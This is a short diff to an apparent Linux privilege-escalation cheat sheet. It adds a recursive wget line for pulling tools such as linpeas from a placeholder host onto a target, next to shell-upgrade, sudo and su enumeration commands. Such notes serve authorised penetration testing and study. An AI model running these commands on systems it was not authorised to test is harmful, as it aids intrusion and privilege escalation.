@@ -6,6 +6,7 @@
 ./unix-privesc-check standard
 ~~~Manual Enumeration Quick Start~~~
 /usr/bin/script -qc /bin/bash /dev/null
+wget -r -l 1 -np -nd http://example.com/directory/      #Download all files in target directory, no parent/child dir. Good for moving linpeas, etc.
 sudo -l
 su root
 id
